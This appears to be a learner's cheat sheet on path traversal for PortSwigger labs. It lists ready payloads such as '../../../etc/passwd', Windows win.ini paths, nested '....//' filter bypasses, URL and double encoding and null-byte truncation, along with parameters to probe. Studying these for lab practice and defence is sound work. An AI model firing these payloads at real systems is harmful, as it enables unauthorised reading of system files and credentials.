# Path Traversal

> **PortSwigger topic:** https://portswigger.net/web-security/file-path-traversal
> Also called directory traversal.

## Cheat sheet

User-controlled filename → filesystem read → no sanitization. Use `../` to escape the intended directory.

**Try these payloads first:**

- `../../../etc/passwd` — Linux baseline
- `..\..\..\windows\win.ini` — Windows
- `....//....//etc/passwd` — single-pass `../` filter bypass
- `%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd` — URL-encoded
- `%252e%252e%252f...` — double-encoded
- `/etc/passwd` — absolute path if app prepends a base dir
- Append `%00` (null byte) on legacy PHP / Java with appended extensions

**Hunt for:** `?file=`, `?image=`, `?doc=`, `?download=`, `?page=`. Anything filename-shaped.

## My version

The app takes a filename from the user and reads it from disk. If it doesn't sanitize the path, I can use `../` to step out of the intended directory and read whatever I want. Classic targets: `/etc/passwd`, app source code, config files, anything with credentials.

Mental model: user-controlled input → filesystem read → no sanitization.

## What to look for

- Any param that looks like a filename: `?file=`, `?image=`, `?doc=`, `?download=`, `?page=`
- Image tags with paths: `<img src="/loadImage?filename=X">`
- File download endpoints
- "View attachment" or "preview" features

If a request has a path or filename in it, I try traversal.

## Payloads I reach for

Linux:

```
../../../etc/passwd
../../../../../../etc/passwd            # extra ../ in case I'm deeper than I think
....//....//....//etc/passwd            # nested traversal (if .. is filtered)
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd # URL-encoded
%252e%252e%252f...                      # double-encoded
```

Windows:

```
..\..\..\windows\win.ini
..\..\..\windows\system32\drivers\etc\hosts
```

If the app strips a single `../`, the `....//` trick still leaves a `../` after the inner one is removed. Same idea for double URL encoding when the first decode happens before the filter.

## When basic traversal fails

- URL encoding (`%2e%2e%2f`)
- Double encoding (`%252e%252e%252f`)
- Nested patterns (`....//`, `..././`)
- Null byte (`%00`) on older PHP / Java stacks
- If the app appends an extension (`?file=X.png`), try ending the payload with the expected extension or use a null byte to truncate
- Absolute paths (`?file=/etc/passwd`) if the app prepends a base dir but doesn't actually enforce it

## Lab writeups

Add links as I complete labs.
